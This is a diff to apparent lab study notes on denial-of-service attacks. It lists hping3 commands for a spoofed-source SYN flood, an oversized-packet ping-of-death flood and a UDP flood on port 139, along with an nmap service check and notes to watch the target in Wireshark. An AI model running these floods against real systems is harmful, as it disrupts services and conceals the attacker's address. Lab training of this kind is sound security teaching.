@@ -7,7 +7,7 @@
 * **Target:**
   * Wireshark-\&gt;Ethernet
 * **Attacker**
-  * **hping3 -S \[Target IP] -a \[Spoofable IP] -p 22 -flood**
+  * **hping3 -S \<Target IP> -a \<Spoofable IP> -p 22 -flood**
     * **-S: Set the SYN flag**
     * **-a: Spoof the IP address**
     * **-p: Specify the destination port**
@@ -15,12 +15,12 @@
 * **Target**
   * Check wireshark
 * **Attacker (Perform PoD)**
-  * **hping3 -d 65538 -S -p 21 –flood \[Target IP]**
+  * **hping3 -d 65538 -S -p 21 –flood \<Target IP>**
     * **-d: Specify data size**
     * **-S: Set the SYN flag**
 * **Attacker (Perform UDP application layer flood attack)**
   * nmap -p 139 10.10.10.19 (check service)
-  * **hping3 -2 -p 139 –flood \[IP]**
+  * **hping3 -2 -p 139 –flood \<Target IP>**
     * **-2: Specify UDP mode**
 * **Other UDP-based applications and their ports**
   * CharGen UDP Port 19
